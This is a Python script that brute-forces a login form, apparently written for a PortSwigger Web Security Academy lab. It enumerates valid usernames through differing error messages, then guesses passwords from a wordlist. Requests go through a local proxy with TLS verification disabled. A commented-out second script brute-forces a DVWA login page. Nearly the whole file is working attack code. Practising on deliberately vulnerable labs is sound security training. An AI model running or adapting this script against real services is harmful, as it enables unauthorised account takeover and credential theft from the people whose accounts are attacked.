import requests
import urllib
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

URl = 'https://0ab100c604b3429ac0d68b2700d2004f.web-security-academy.net/login'

username_file = open("username.txt", "r")
password_file = open("password.txt", "r")

def getusername_and_password(file, file1):
    for username in file.readlines() :
        username = username.strip("\n")
        data1 = {'username' : username, 'password' : '123'}
        r = requests.post(URl, data=data1, verify=False, proxies=proxies)
        if 'Invalid username' in r.text:
            print("Currently at %s username..." %username)
        else:
            valid_username = username
            print("Found! %s is a valid username!" %username)
            break
    for password in file1.readlines():
        password = password.strip("\n")
        data2 = {'username' : valid_username, 'password' : password}
        r = requests.post(URl, data=data2, verify=False, proxies=proxies)
        if 'Incorrect password' in r.text:
            print("Currently at %s password..." %password)
        else:
            print("Found! %s is a valid password for %s!" % (password,valid_username))
            break

getusername_and_password(username_file, password_file)

"""
import requests

# define the webpage you want to crack

# this page must be a login page with a username and password

url = "http://192.168.2.18/dvwa/login.php"

# let's get the username

username = input("What is the username you wish to attempt? ")

# next, let's get the password file

password_file = input("Please enter the name of the password file: ")

# open the password file in read mode

file = open(password_file, "r")

# now let's get each password in the password_file

for password in file.readlines():

# let's strip it of any \n

password = password.strip("\n")

# collect the data needed from "inspect element"

data = {'username':username, 'password':password, "Login":'submit'}

send_data_url = requests.post(url, data=data)

if "Login failed" in str(send_data_url.content):

print("[*] Attempting password: %s" % password)

else:

print("[*] Password found: %s " % password)
"""